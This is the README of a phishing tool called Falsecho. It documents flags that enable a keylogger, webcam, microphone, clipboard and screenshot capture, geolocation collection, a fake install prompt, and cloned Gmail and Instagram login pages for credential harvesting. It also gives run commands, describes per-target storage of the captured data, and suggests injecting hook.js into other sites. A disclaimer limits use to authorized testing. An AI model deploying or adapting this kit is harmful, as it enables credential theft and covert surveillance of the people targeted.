# Falsecho – Advanced Phishing Tool

It captures data such as webcam, microphone, clipboard content, and geolocation. It supports Progressive Web App (PWA) behavior, customizable phishing templates for credential harvesting, and realistic login page emulation. All interactions are tracked securely over HTTPS, enabling precise behavioral and consent-based testing.

> ⚠️ This tool is intended for **educational**, **research**, and **authorized security testing** purposes only. Unauthorized usage is strictly prohibited.

---

## 🚀 Features

Falsecho can be customized with a wide range of telemetry and interaction modules, enabled via command-line flags:

- `-enable-all`: Enable all available features
- `-enable-clipboard`: Access and monitor clipboard content
- `-enable-install`: Display and handle a fake install button
- `-enable-keylogger`: Keylogger
- `-enable-location`: Request and collect geolocation data
- `-enable-microphone`: Request access to microphone
- `-enable-pwa`: Enable Progressive Web App (PWA) behaviors
- `-enable-screenshot`: Attempt to capture screen content
- `-enable-webcam`: Request access to webcam
- `-hook-interval`: Define polling interval for data hooks (default: 5000ms)
- `-hook-server`: Specify domain or IP address for data collection (required)
- `-install-url`: Redirect target when install button is clicked
- `-port`: Set port for the web server (default: 443)
- `-template`: Choose page template (e.g. `gmail`, `instagram`, etc.)

---

## 🧩 Templates

Templates define the fake page served to the target. You can use built-in templates or add your own.

### Using Built-in Templates

- `gmail`: Gmail login interface
- `instagram`: Instagram login interface

### Adding Custom Templates

1. Place your HTML file inside the `/static/templates` directory.
2. Add a new entry to the `templateMap` in `main.go`:
   ```go
   var templateMap = map[string]string{
       "instagram": "instagram.html",
       "gmail":     "gmail.html",
       "yourname":  "yourfile.html",
   }
   ```
3. Run the tool with `-template yourname`

---

## 🛠️ Usage Examples

### ✅ All permissions + PWA + install button (Gmail template)

```bash
go run . -hook-server localhost -port 443 -enable-all -enable-pwa -enable-install -install-url https://google.com -template gmail
```

### ✅ All permissions only

```bash
go run . -hook-server localhost -port 443 -enable-all
```

### ✅ Minimal (default info only)

```bash
go run . -hook-server localhost -port 443
```

**Collected by default:**

- Battery status  
- Social media presence  
- Network info  
- User-Agent and fingerprinting  

### ✅ Webcam only

```bash
go run . -hook-server localhost -port 443 -enable-webcam
```

### ✅ Default info + Gmail login page

```bash
go run . -hook-server localhost -port 443 -template gmail
```

---

## 📦 Output & Logging

All captured data is stored under the `data/` directory. Each target session creates its own folder which may include:

- Screenshots
- Audio files
- Webcam captures
- Clipboard dumps
- Keylogger logs and more

---

## 🌐 Deployment & Hook.js

Falsecho runs **only over HTTPS** (port `443` by default).

Although the Go-based backend can be compiled (`go build`), the tool heavily depends on the static files—especially `hook.js`. This file contains the client-side logic that gathers data and interacts with the browser.

You can also deploy `hook.js` independently by injecting it into any external site you control.

---

## ⚠️ Legal Disclaimer

Falsecho is developed and provided strictly for **educational purposes**, **authorized red team operations**, and **security research** in controlled environments.

- You are **solely responsible** for how you use this software.
- The author(s) do **not endorse or condone** any unauthorized access, surveillance, data collection, or phishing activity.
- **Using this tool against systems, users, or networks without explicit permission is illegal** and may result in criminal prosecution.

By using this project, you agree to use it **only in compliance with all applicable laws and regulations**.  
The author assumes **no liability** for any misuse or damage caused by this software.

---

## 📄 License

This project is licensed under [MIT License](LICENSE), however, **usage must comply with all applicable laws and regulations**.

---

## 👤 Author

Created by BEND0US
